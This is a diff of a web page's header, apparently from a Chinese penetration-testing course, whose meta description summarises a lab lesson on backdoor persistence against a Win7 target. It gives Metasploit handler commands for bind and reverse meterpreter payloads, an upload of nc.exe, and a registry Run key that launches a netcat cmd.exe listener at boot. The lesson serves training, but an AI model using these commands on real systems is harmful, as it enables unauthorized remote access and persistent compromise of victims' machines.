@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-cn" dir="ltr">
+<html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" 本篇内容使用win7-sp1靶机，请在资源库中自行下载导入\n进阶后门操作 复习 进入kali后若想要连接此前已经设置好的后门：\n通过服务启动 1 2 3 4 5 use exploit/multi/handler setpayload windows/metsvc_bind_tcp set lport 31337 set rhost [目标ip] run 永久性后门 1 2 3 4 5 use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lport 4321 set lhost [自己ip] run 植入备用后门 上传文件 我们从【win10攻击机】中取nc.exe复制到kali中的kali文件夹，\n回到meterpreter终端：\n1 upload /home/kali/nc.exe c:\\\\ 将nc.exe上传到对方的C盘\n修改注册表 查看对方开机自启的配置\n1 reg enumkey -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run 为了防止meterpreter失效，接下来我们要把nc放到对方的自动启动里当作后门\n1 reg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v nc -d &#39;c:\\nc.exe -ldp 444 -e cmd.exe&#39; 这句话的意思是开机时启动nc并且执行后面的命令使它监听444端口，如果监听到连接就返回一个cmd命令行\n">
 <title>1.12 进阶后门操作</title>
